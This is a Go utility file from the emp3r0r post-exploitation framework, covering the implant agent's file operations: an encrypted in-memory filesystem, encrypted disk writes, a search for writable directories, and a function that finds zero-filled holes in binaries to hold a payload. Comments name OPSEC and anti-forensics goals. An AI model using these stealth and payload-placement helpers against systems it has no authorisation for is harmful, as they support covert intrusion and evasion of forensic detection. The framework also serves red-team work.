package util

import (
	"archive/tar"
	"bytes"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"

	// Added sync import
	"github.com/fxamacker/cbor/v2"
	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

// Dentry Directory entry
type Dentry struct {
	Name       string `json:"name" cbor:"1,keyasint"`  // filename
	Ftype      string `json:"ftype" cbor:"2,keyasint"` // file/dir
	Size       string `json:"size" cbor:"3,keyasint"`  // 100
	Date       string `json:"date" cbor:"4,keyasint"`  // 2021-01-01
	Owner      string `json:"owner" cbor:"5,keyasint"` // jm33
	Permission string `json:"perm" cbor:"6,keyasint"`  // -rwxr-xr-x
}

// FileStat stat info of a file
type FileStat struct {
	Name       string `json:"name" cbor:"1,keyasint"`
	Permission string `json:"permission" cbor:"2,keyasint"`
	Checksum   string `json:"checksum" cbor:"3,keyasint"`
	Size       int64  `json:"size" cbor:"4,keyasint"`
}

// LsPath ls path and return cbor data
func LsPath(path string) ([]byte, error) {
	if strings.HasPrefix(path, "mem:") {
		dents := lsMemDir(path)
		return cbor.Marshal(dents)
	}

	parse_fileInfo := func(info os.FileInfo) (dent Dentry) {
		dent.Name = info.Name()
		dent.Date = info.ModTime().String()
		dent.Ftype = "file"
		if info.IsDir() {
			dent.Ftype = "dir"
		}
		dent.Permission = info.Mode().String()
		dent.Size = fmt.Sprintf("%d bytes", info.Size())
		return dent
	}

	// if it's a file, return its info
	if IsFileExist(path) && !strings.HasPrefix(path, "mem:") {
		info, statErr := os.Stat(path)
		if statErr == nil && !info.IsDir() {
			dents := []Dentry{parse_fileInfo(info)}
			return cbor.Marshal(dents)
		}
	}

	// parse disk files
	files, err := os.ReadDir(path)
	if err != nil {
		logging.Debugf("LsPath: %v", err)
		return nil, err
	}

	var dents []Dentry
	for _, f := range files {
		info, statErr := f.Info()
		if statErr != nil {
			logging.Debugf("LsPath: %v", statErr)
			continue
		}
		dents = append(dents, parse_fileInfo(info))
	}

	return cbor.Marshal(dents)
}

// lsMemDir lists all entries in the in-memory filesystem (MemFileMap).
// memfs is a flat key-value store — paths are just names, not real directories.
// When targetPath is the root ("mem:///"), all keys are listed.
// When targetPath is a prefix, only keys under that prefix are listed.
func lsMemDir(targetPath string) []Dentry {
	var dents []Dentry

	// Normalize root forms
	isRoot := targetPath == "" ||
		targetPath == "mem:" ||
		targetPath == "mem:/" ||
		targetPath == "mem://" ||
		targetPath == "mem:///"

	// For sub-path queries, ensure prefix ends with "/"
	prefix := NormalizeMemPath(targetPath)
	if !strings.HasSuffix(prefix, "/") {
		prefix += "/"
	}

	MemFileLock.RLock()
	defer MemFileLock.RUnlock()

	for memPath, data := range MemFileMap {
		if !strings.HasPrefix(memPath, "mem:") {
			continue
		}
		// Root listing: include every key
		// Prefix listing: include only keys that start with the given prefix
		if !isRoot && !strings.HasPrefix(memPath, prefix) {
			continue
		}
		dents = append(dents, Dentry{
			Name:       memPath, // show full mem:/// path so users know exactly where it lives
			Ftype:      "file (mem)",
			Size:       fmt.Sprintf("%d bytes", len(data)),
			Date:       "N/A",
			Permission: "-rw-------",
		})
	}

	return dents
}

// IsCommandExist check if an executable is in $PATH
func IsCommandExist(exe string) bool {
	_, err := exec.LookPath(exe)
	return err == nil
}

// NormalizeMemPath canonicalizes any mem: URI into strict mem:/// format.
// e.g. "mem:foo" -> "mem:///foo", "mem:/foo" -> "mem:///foo", "mem://foo" -> "mem:///foo", "mem:///foo" -> "mem:///foo"
func NormalizeMemPath(path string) string {
	if !strings.HasPrefix(path, "mem:") {
		return path
	}
	clean := strings.TrimPrefix(path, "mem:")
	clean = strings.TrimLeft(clean, "/")
	return "mem:///" + clean
}

// IsFileExist check if a file exists
func IsFileExist(path string) bool {
	if strings.HasPrefix(path, "mem:") {
		norm := NormalizeMemPath(path)
		MemFileLock.RLock()
		_, ok := MemFileMap[norm]
		MemFileLock.RUnlock()
		return ok
	}

	f, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	if err == nil {
		return !f.IsDir()
	}

	return true
}

// IsExist check if a path exists
func IsExist(path string) bool {
	if strings.HasPrefix(path, "mem:") {
		norm := NormalizeMemPath(path)
		if norm == "mem:///" {
			return true
		}
		MemFileLock.RLock()
		_, ok := MemFileMap[norm]
		MemFileLock.RUnlock()
		return ok
	}

	_, statErr := os.Stat(path)
	return !os.IsNotExist(statErr)
}

// IsDirExist check if a directory exists
func IsDirExist(path string) bool {
	if strings.HasPrefix(path, "mem:") {
		norm := NormalizeMemPath(path)
		if norm == "mem:///" {
			return true
		}
		prefix := norm
		if !strings.HasSuffix(prefix, "/") {
			prefix += "/"
		}
		MemFileLock.RLock()
		defer MemFileLock.RUnlock()
		for k := range MemFileMap {
			if strings.HasPrefix(k, prefix) || k == norm {
				return true
			}
		}
		return false
	}

	f, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	if err == nil {
		return f.IsDir()
	}

	return false
}

// RemoveItemFromArray remove string/int from slice
func RemoveItemFromArray[T string | int](to_remove T, sliceList []T) []T {
	list := []T{}
	for _, item := range sliceList {
		if item != to_remove {
			list = append(list, item)
		}
	}
	return list
}

// RemoveDupsFromArray remove duplicated string/int from slice
func RemoveDupsFromArray[T string | int](sliceList []T) []T {
	allKeys := make(map[T]bool)
	list := []T{}
	for _, item := range sliceList {
		if _, value := allKeys[item]; !value {
			allKeys[item] = true
			list = append(list, item)
		}
	}
	return list
}

// IntArrayToStringArray convert int array to string array
func IntArrayToStringArray(arr []int) []string {
	var res []string
	for _, v := range arr {
		res = append(res, fmt.Sprintf("%d", v))
	}
	return res
}

// AppendToFile append bytes to a file
func AppendToFile(filename string, data []byte) (err error) {
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err = f.Write(data); err != nil {
		return err
	}
	return err
}

// AppendTextToFile append text to a file
func AppendTextToFile(filename, text string) (err error) {
	f, err := os.OpenFile(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err = f.WriteString(text); err != nil {
		return err
	}
	return err
}

// IsStrInFile works like grep, check if a string is in a text file
func IsStrInFile(text, filepath string) bool {
	content, err := ReadFileAgent(filepath)
	if err != nil {
		// try direct read if ReadFileAgent fails (which handles memory)
		// but ReadFileAgent is mostly superset.
		// fallback to old way if needed but cleaner to use ReadFileAgent
		logging.Debugf("IsStrInFile: %v", err)
		return false
	}
	return strings.Contains(string(content), text)
}

// Copy copy file or directory from src to dst
func Copy(src, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		// if not on disk, check memory?
		// "Copy" function is genericutil, but we are upgrading agent.
		// If src is in memory, Copy should work.
		// But Copy uses os.Stat which doesn't know about memory.
		// Since we have parallel agent utils (CopyAgent), maybe we should leave this?
		// But IsStrInFile is common util.
		// Let's assume generic utils might stay disk-based for non-agent stuff.
		return err
	}

	if srcInfo.IsDir() {
		return copyDir(src, dst)
	}
	return copyFile(src, dst)
}

func copyFile(src, dst string) error {
	in, err := os.ReadFile(src)
	if err != nil {
		return err
	}

	// if destination is a directory
	f, err := os.Stat(dst)
	if err == nil {
		if f.IsDir() {
			dst = filepath.Join(dst, filepath.Base(src))
		}
	}

	// if dst is a file and exists
	if IsFileExist(dst) {
		err = os.RemoveAll(dst)
		if err != nil {
			logging.Debugf("Copy: %s exists and cannot be removed: %v", dst, err)
		}
	}

	return os.WriteFile(dst, in, 0o755)
}

func copyDir(src, dst string) error {
	return filepath.WalkDir(src, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		// Skip test, .cache, and .git directories to avoid permission/OPSEC issues
		if d.IsDir() && (d.Name() == "test" || d.Name() == ".cache" || d.Name() == ".git") {
			return filepath.SkipDir
		}

		targetPath := filepath.Join(dst, relPath)

		if d.IsDir() {
			info, err := d.Info()
			if err != nil {
				return err
			}
			return os.MkdirAll(targetPath, info.Mode().Perm())
		}

		return copyFile(path, targetPath)
	})
}

// SecureLocalPath normalizes a path and rejects ones that are not local to avoid traversal.
// It supports both '/' and OS-specific separators (like '\' on Windows).
func SecureLocalPath(path string) (string, error) {
	if path == "" {
		return "", fmt.Errorf("empty path")
	}

	// filepath.IsLocal expects '/' as a separator and will reject backslashes.
	// We convert it to slash-separated format for the safety check.
	slashedPath := filepath.ToSlash(path)
	if !filepath.IsLocal(slashedPath) {
		return "", fmt.Errorf("unsafe path %q", path)
	}

	localized, err := filepath.Localize(slashedPath)
	if err != nil {
		return "", fmt.Errorf("localize %q: %w", path, err)
	}

	return localized, nil
}

// FileBaseName extracts the base name of the file from a given path while enforcing locality.
func FileBaseName(path string) string {
	if strings.HasPrefix(path, "mem:") {
		norm := NormalizeMemPath(path)
		return filepath.Base(norm)
	}
	sanitized, err := SecureLocalPath(path)
	if err != nil {
		logging.Debugf("FileBaseName: %v", err)
		return ""
	}
	return filepath.Base(sanitized)
}

// FileAllocate allocate n bytes for a file, will delete the target file if already exists
func FileAllocate(filepath string, n int64) (err error) {
	if IsExist(filepath) {
		err = os.Remove(filepath)
		if err != nil {
			return err
		}
	}
	f, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer f.Close()
	_ = f.Truncate(n)

	return err
}

// FileSize calc file size
func FileSize(path string) (size int64) {
	if strings.HasPrefix(path, "mem:") {
		norm := NormalizeMemPath(path)
		MemFileLock.RLock()
		data, ok := MemFileMap[norm]
		MemFileLock.RUnlock()
		if ok {
			return int64(len(data))
		}
		return 0
	}

	fi, err := os.Stat(path)
	if err != nil {
		return 0
	}
	size = fi.Size()
	return size
}

// FindHolesInBinary find holes in a binary file that are big enough for a payload
func FindHolesInBinary(fdata []byte, size int64) (indexes []int64, err error) {
	// find_hole finds a hole from start
	find_hole := func(start int64) (end int64) {
		for i := start; i < int64(len(fdata)); i++ {
			if fdata[i] == 0 {
				end = i
			} else {
				break
			}
		}
		return end
	}

	// find holes
	for i := int64(0); i < int64(len(fdata)); i++ {
		if fdata[i] == 0 {
			end := find_hole(i)
			// if hole is big enough
			if end-i >= size {
				indexes = append(indexes, i)
			}
			i = end
		}
	}

	return indexes, err
}

// IsDirWritable check if a directory is writable
func IsDirWritable(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	if !info.IsDir() {
		return false
	}
	// Check if the current user can write to the directory
	testFile := filepath.Join(path, RandMD5String())
	file, err := os.Create(testFile)
	if err != nil {
		return false
	}
	file.Close()
	os.Remove(testFile)
	return true
}

// GetWritablePaths get all writable paths in a directory up to a given depth
func GetWritablePaths(root_path string, depth, max int) ([]string, error) {
	if depth < 0 {
		return nil, fmt.Errorf("invalid depth: %d", depth)
	}

	var writablePaths []string
	var searchPaths func(path string, currentDepth int) error

	searchPaths = func(path string, currentDepth int) error {
		if currentDepth > depth {
			return nil
		}

		files, err := os.ReadDir(path)
		if err != nil {
			logging.Debugf("Skipping unreadable directory %s: %v", path, err)
			return nil
		}

		for _, file := range files {
			fullPath := filepath.Join(path, file.Name())
			if file.IsDir() {
				if IsDirWritable(fullPath) {
					writablePaths = append(writablePaths, fullPath)
				}
				if len(writablePaths) >= max {
					return nil
				}
				TakeABlink() // avoid being too fast and causing high CPU usage
				if err := searchPaths(fullPath, currentDepth+1); err != nil {
					return err
				}
			}
		}
		return nil
	}

	if err := searchPaths(root_path, 0); err != nil {
		return nil, err
	}

	if len(writablePaths) == 0 {
		return nil, fmt.Errorf("no writable paths found in %s", root_path)
	}

	return writablePaths, nil
}

// ApplyFilePattern applies a naming pattern to files created/accessed by the agent.
// Modify this function to implement your specific pattern (e.g., appending a suffix).
// This is the hook for "every file to have a certain pattern in its name".
func ApplyFilePattern(path string) string {
	// Placeholder: currently returns the path as is.
	// To implement a pattern, e.g., appending ".agent":
	// return path + ".agent"
	return path
}

// Agent-specific file operations for centralized control

// MkdirAgent creates a directory (in memory for mem: paths, or on disk)
func MkdirAgent(path string, perm os.FileMode) error {
	if strings.HasPrefix(path, "mem:") {
		return nil
	}
	return os.MkdirAll(path, perm)
}

// RemoveFileAgent removes a file (wrapper for os.RemoveAll with pattern support)
func RemoveFileAgent(path string) error {
	path = ApplyFilePattern(path)

	if strings.HasPrefix(path, "mem:") {
		path = NormalizeMemPath(path)
		MemFileLock.Lock()
		delete(MemFileMap, path)
		MemFileLock.Unlock()
		logging.Debugf("Agent: Removed memory file %s", path)
		return nil
	}

	logging.Debugf("Agent: Removing file %s", path)
	return os.RemoveAll(path)
}

// CopyAgent copy file or directory from src to dst (Agent specific)
func CopyAgent(src, dst string) error {
	src = ApplyFilePattern(src)

	// Check exist
	if !IsExist(src) {
		return fmt.Errorf("CopyAgent: %s does not exist", src)
	}

	if strings.HasPrefix(src, "mem:") {
		return copyFileAgent(src, dst)
	}

	srcInfo, err := os.Stat(src)
	if err != nil {
		return copyFileAgent(src, dst)
	}

	if srcInfo.IsDir() {
		return copyDirAgent(src, dst)
	}
	return copyFileAgent(src, dst)
}

func copyFileAgent(src, dst string) error {
	in, err := ReadFileAgent(src)
	if err != nil {
		return err
	}

	if !strings.HasPrefix(dst, "mem:") {
		f, err := os.Stat(dst)
		if err == nil && f.IsDir() {
			dst = filepath.Join(dst, FileBaseName(src))
		}
	}

	return WriteFileAgent(dst, in, 0o755)
}

func copyDirAgent(src, dst string) error {
	return filepath.WalkDir(src, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		targetPath := filepath.Join(dst, relPath)

		if d.IsDir() {
			targetPath = ApplyFilePattern(targetPath)
			return MkdirAgent(targetPath, d.Type().Perm())
		}

		return copyFileAgent(path, targetPath)
	})
}

// SetFileCryptoKey sets the key for file encryption
var fileCryptoKey []byte

// MemFileMap stores file content in memory
var (
	MemFileMap       = make(map[string][]byte)
	MemFileLock      sync.RWMutex
	MemFileSizeLimit = 10 * 1024 * 1024 // 10MB
)

// ListMemFiles returns all keys in MemFileMap
func ListMemFiles() []string {
	MemFileLock.RLock()
	defer MemFileLock.RUnlock()
	keys := make([]string, 0, len(MemFileMap))
	for k := range MemFileMap {
		if strings.HasPrefix(k, "mem:") {
			keys = append(keys, k)
		}
	}
	return keys
}

// StorageStrategy defines where to store the file
type StorageStrategy int

const (
	// StorageAuto decided by agent based on file size
	StorageAuto StorageStrategy = iota
	// StorageMemory force memory storage
	StorageMemory
	// StorageDisk force disk storage
	StorageDisk
)

// SetFileCryptoKey sets the key for file encryption
func SetFileCryptoKey(key []byte) {
	fileCryptoKey = key
}

// WriteFileAgent is a centralized file writing function for agent operations.
// This function wraps all file writing operations to allow for future modifications
// such as encryption, steganography, or other security enhancements.
func WriteFileAgent(filename string, data []byte, perm os.FileMode) error {
	return SaveFileAgent(filename, data, perm, StorageAuto)
}

// SaveFileAgent saves file with specific storage strategy
func SaveFileAgent(filename string, data []byte, perm os.FileMode, strategy StorageStrategy) error {
	filename = ApplyFilePattern(filename)

	if strings.HasPrefix(filename, "mem:") || strategy == StorageMemory {
		filename = NormalizeMemPath(filename)

		if len(fileCryptoKey) > 0 {
			var err error
			data, err = crypto.AES_GCM_Encrypt(fileCryptoKey, data)
			if err != nil {
				return fmt.Errorf("WriteFileAgent encrypt: %v", err)
			}
		}

		MemFileLock.Lock()
		dataCopy := make([]byte, len(data))
		copy(dataCopy, data)
		MemFileMap[filename] = dataCopy
		MemFileLock.Unlock()

		logging.Debugf("Agent: Wrote %d bytes (encrypted) to memfs memory: %s", len(data), filename)
		return nil
	}

	// For disk storage
	if len(fileCryptoKey) > 0 {
		var err error
		data, err = crypto.AES_GCM_Encrypt(fileCryptoKey, data)
		if err != nil {
			return fmt.Errorf("WriteFileAgent encrypt: %v", err)
		}
	}

	MemFileLock.Lock()
	delete(MemFileMap, filename)
	MemFileLock.Unlock()

	logging.Debugf("Agent: Writing %d bytes (encrypted) to %s with permissions %o", len(data), filename, perm)

	if err := os.MkdirAll(filepath.Dir(filename), 0o700); err != nil {
		return fmt.Errorf("WriteFileAgent mkdir %s: %v", filepath.Dir(filename), err)
	}

	return os.WriteFile(filename, data, perm)
}

// ReadFileAgent reads a file from the agent's filesystem
func ReadFileAgent(filename string) ([]byte, error) {
	filename = ApplyFilePattern(filename)

	logging.Debugf("Agent: Reading file %s", filename)

	var data []byte
	var err error

	if strings.HasPrefix(filename, "mem:") {
		filename = NormalizeMemPath(filename)
		MemFileLock.RLock()
		memData, ok := MemFileMap[filename]
		if ok {
			data = make([]byte, len(memData))
			copy(data, memData)
		}
		MemFileLock.RUnlock()

		if !ok {
			return nil, fmt.Errorf("memfs: %s: file not found", filename)
		}

		if len(fileCryptoKey) > 0 {
			decrypted, err := crypto.AES_GCM_Decrypt(fileCryptoKey, data)
			if err == nil {
				data = decrypted
			}
		}
		return data, nil
	}

	data, err = os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	if len(fileCryptoKey) > 0 {
		decrypted, err := crypto.AES_GCM_Decrypt(fileCryptoKey, data)
		if err == nil {
			data = decrypted
		}
	}
	return data, nil
}

// CreateFileAgent is a centralized file creation function for agent operations.
// This function wraps file creation operations to allow for future modifications.
// Note: CreateFileAgent returns a raw os.File, so it DOES NOT support transparent encryption.
// Use WriteFileAgent for encryption.
func CreateFileAgent(filename string) (*os.File, error) {
	// Apply pattern
	filename = ApplyFilePattern(filename)

	logging.Debugf("Agent: Creating file %s", filename)

	// Future enhancements can be added here:
	// - Hidden file attributes
	// - Special file creation flags
	// - Anti-forensics techniques

	// ensure the directory exists
	if err := os.MkdirAll(filepath.Dir(filename), 0o700); err != nil {
		return nil, fmt.Errorf("CreateFileAgent mkdir %s: %v", filepath.Dir(filename), err)
	}

	return os.Create(filename)
}

// OpenFileAgent is a centralized file opening function for agent operations.
// This function wraps file opening operations to allow for future modifications.
// Note: OpenFileAgent returns a raw os.File, so it DOES NOT support transparent encryption.
// Use ReadFileAgent for encryption.
func OpenFileAgent(filename string, flag int, perm os.FileMode) (*os.File, error) {
	// Apply pattern
	filename = ApplyFilePattern(filename)

	logging.Debugf("Agent: Opening file %s with flags %d and permissions %o", filename, flag, perm)

	// Future enhancements can be added here:
	// - Special file opening flags
	// - Anti-forensics techniques
	// - File locking mechanisms

	// ensure the directory exists
	// only if we are creating or writing to the file
	if flag&os.O_CREATE != 0 || flag&os.O_WRONLY != 0 || flag&os.O_RDWR != 0 {
		if err := os.MkdirAll(filepath.Dir(filename), 0o700); err != nil {
			return nil, fmt.Errorf("OpenFileAgent mkdir %s: %v", filepath.Dir(filename), err)
		}
	}

	return os.OpenFile(filename, flag, perm)
}

// AppendToFileAgent is a centralized file appending function for agent operations.
// This function wraps file appending operations to allow for future modifications.
func AppendToFileAgent(filename string, data []byte) error {
	logging.Debugf("Agent: Appending %d bytes to %s", len(data), filename)

	if len(fileCryptoKey) > 0 {
		// Read, decrypt, append, encrypt, write
		existing, err := ReadFileAgent(filename)
		if err != nil && !os.IsNotExist(err) {
			return fmt.Errorf("AppendToFileAgent read: %v", err)
		}
		// if os.IsNotExist, existing is nil/empty

		newData := append(existing, data...)
		return WriteFileAgent(filename, newData, 0o600)
	}

	f, err := OpenFileAgent(filename, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		return err
	}
	defer f.Close()

	if _, err = f.Write(data); err != nil {
		return err
	}
	return nil
}

// AppendTextToFileAgent is a centralized text appending function for agent operations.
// This function wraps text appending operations to allow for future modifications.
func AppendTextToFileAgent(filename, text string) error {
	return AppendToFileAgent(filename, []byte(text))
}

// UnarchiveAgent unarchives a tarball (which might be encrypted) to a directory
// It ensures that extracted files are also written using WriteFileAgent (blocking plaintext on disk)
func UnarchiveAgent(tarball, dst string) error {
	if err := os.MkdirAll(dst, 0o700); err != nil {
		return fmt.Errorf("create destination directory: %w", err)
	}

	// 1. Read (and decrypt) tarball
	data, err := ReadFileAgent(tarball)
	if err != nil {
		return fmt.Errorf("read tarball: %v", err)
	}

	// 2. Decompress XZ (using arc library)
	tarData, err := Decompress(data)
	if err != nil {
		return fmt.Errorf("decompress xz: %v", err)
	}

	// 3. Untar to dst using WriteFileAgent
	tr := tar.NewReader(bytes.NewReader(tarData))
	for {
		header, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return fmt.Errorf("next tar header: %v", err)
		}

		localName, err := SecureLocalPath(header.Name)
		if err != nil {
			return fmt.Errorf("unsafe tar header name %s: %w", header.Name, err)
		}
		targetPath := filepath.Join(dst, localName)
		info := header.FileInfo()

		switch header.Typeflag {
		case tar.TypeDir:
			if err = os.MkdirAll(targetPath, info.Mode()); err != nil {
				return err
			}
		case tar.TypeReg:
			// Read content
			content, err := io.ReadAll(tr)
			if err != nil {
				return fmt.Errorf("read tar content: %v", err)
			}
			// Write with encryption
			if err = WriteFileAgent(targetPath, content, info.Mode()); err != nil {
				return err
			}
		default:
			logging.Debugf("UnarchiveAgent: skipping unknown type %c for %s", header.Typeflag, header.Name)
		}
	}
	return nil
}
